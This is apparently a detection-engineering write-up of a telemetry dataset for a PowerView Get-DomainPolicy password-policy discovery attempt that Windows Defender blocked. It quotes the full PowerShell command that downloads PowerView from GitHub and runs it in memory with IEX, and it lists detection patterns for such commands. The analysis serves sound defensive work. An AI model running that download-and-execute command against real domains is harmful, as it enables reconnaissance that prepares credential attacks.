# T1201-9: Password Policy Discovery — Get-DomainPolicy with PowerView

## Technique Context

T1201 (Password Policy Discovery) involves adversaries attempting to access password policy information to understand password complexity requirements, lockout policies, and other authentication controls. This knowledge helps attackers craft more effective password attacks, understand account lockout thresholds, and plan credential-based attacks. PowerView's Get-DomainPolicy function is a popular post-exploitation tool that queries Active Directory for domain password policy information, including minimum password length, complexity requirements, lockout thresholds, and password history. Detection engineers focus on identifying PowerShell execution patterns, specific PowerView function calls, LDAP queries against domain controllers, and unusual domain policy enumeration activity.

## What This Dataset Contains

The dataset captures an attempt to execute PowerView's Get-DomainPolicy function through PowerShell. The key evidence appears in Security Event 4688, which shows the PowerShell process creation with the command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainPolicy -verbose}`. This command attempts to download PowerView from GitHub and execute the domain policy enumeration function.

However, the execution fails as evidenced by Security Event 4689 showing the PowerShell process exit with status code `0xC0000022` (STATUS_ACCESS_DENIED), indicating Windows Defender blocked the operation. Sysmon captures extensive telemetry including process creation (EID 1) for whoami.exe execution, DLL loading events (EID 7) showing .NET runtime initialization, process access events (EID 10), and CreateRemoteThread activity (EID 8). The PowerShell operational channel contains only test framework boilerplate events with Set-ExecutionPolicy commands.

## What This Dataset Does Not Contain

This dataset lacks the actual PowerView execution telemetry because Windows Defender successfully blocked the technique before completion. Missing elements include: actual PowerView script content in PowerShell script block logs (EID 4104), LDAP queries to domain controllers for policy information, network connections to the GitHub URL for PowerView download (blocked by Defender), successful domain policy enumeration results, and any follow-on credential attack preparation activities. The dataset also doesn't contain Sysmon ProcessCreate events for the PowerShell processes themselves due to the sysmon-modular configuration using include-mode filtering that doesn't capture standard PowerShell.exe executions.

## Assessment

This dataset provides excellent visibility into Windows Defender's blocking capabilities against PowerView-based domain enumeration attempts. The Security audit logs with command-line logging offer the primary detection value, capturing the complete attack command line including the GitHub URL and specific PowerView function call. The Sysmon telemetry adds depth with process interaction details and DLL loading patterns, though the core PowerShell execution details are captured via Security events rather than Sysmon due to configuration choices. For detection engineering, this demonstrates how endpoint protection can prevent technique completion while still generating valuable attempt telemetry.

## Detection Opportunities Present in This Data

1. **PowerView Download Attempt Detection** - Monitor Security 4688 events for command lines containing "PowerShellMafia/PowerSploit" or "PowerView.ps1" URLs indicating PowerView acquisition attempts

2. **Get-DomainPolicy Function Call Detection** - Alert on PowerShell command lines containing "Get-DomainPolicy" function calls, especially when combined with remote script download patterns

3. **GitHub PowerSploit Repository Access** - Detect command lines referencing "raw.githubusercontent.com" combined with PowerSploit framework paths as indicators of offensive tool download

4. **PowerShell IEX with Remote Download Pattern** - Monitor for "IEX (IWR" or "Invoke-Expression" combined with web requests in PowerShell command lines

5. **Blocked Execution with Suspicious Command Lines** - Correlate process exit codes of 0xC0000022 with command lines containing known offensive PowerShell patterns to identify blocked attack attempts

6. **PowerShell Process Access to System Processes** - Alert on Sysmon EID 10 events showing PowerShell processes accessing other system processes with high-privilege access rights (0x1FFFFF)

7. **CreateRemoteThread from PowerShell** - Monitor Sysmon EID 8 events where PowerShell processes create remote threads in other processes, indicating potential injection techniques
